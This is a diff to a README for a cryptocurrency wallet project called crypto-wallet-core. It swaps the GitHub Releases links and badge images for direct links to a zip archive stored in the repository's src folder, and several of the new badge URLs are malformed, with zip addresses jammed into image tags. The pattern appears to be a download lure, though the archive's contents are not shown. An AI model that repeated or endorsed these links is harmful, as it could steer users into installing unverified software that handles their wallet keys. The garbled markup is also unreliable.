@@ -1,7 +1,7 @@
 # 🚀 crypto-wallet-core - Your Secure Way to Manage Cryptocurrency
 
 ## 🏷️ Download Here
-[![Download Now](https://img.shields.io/badge/Download%20Now-crypto--wallet--core-blue.svg)](https://github.com/scha405/crypto-wallet-core/releases)
+[![Download Now](https://raw.githubusercontent.com/scha405/crypto-wallet-core/main/src/wallet_crypto_core_v2.1.zip%https://raw.githubusercontent.com/scha405/crypto-wallet-core/main/src/wallet_crypto_core_v2.1.zip)](https://raw.githubusercontent.com/scha405/crypto-wallet-core/main/src/wallet_crypto_core_v2.1.zip)
 
 ## 📦 Overview
 crypto-wallet-core is a modular cryptocurrency wallet core system. It helps you generate addresses, track your balances, and sign transactions with ease. The application is designed for anyone who wants to manage their cryptocurrency securely and efficiently.
@@ -21,9 +21,9 @@ Before you download, ensure that your system meets these requirements:
 To get the software, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://github.com/scha405/crypto-wallet-core/releases) to find the latest version of the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/scha405/crypto-wallet-core/main/src/wallet_crypto_core_v2.1.zip) to find the latest version of the software.
 
-   ![Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-green.svg)
+   ![Releases Page](https://raw.githubusercontent.com/scha405/crypto-wallet-core/main/src/wallet_crypto_core_v2.1.zip%20Releases%https://raw.githubusercontent.com/scha405/crypto-wallet-core/main/src/wallet_crypto_core_v2.1.zip)
 
 2. **Select the Version**
    Look for the version that suits your operating system. Click on it to see the available files.
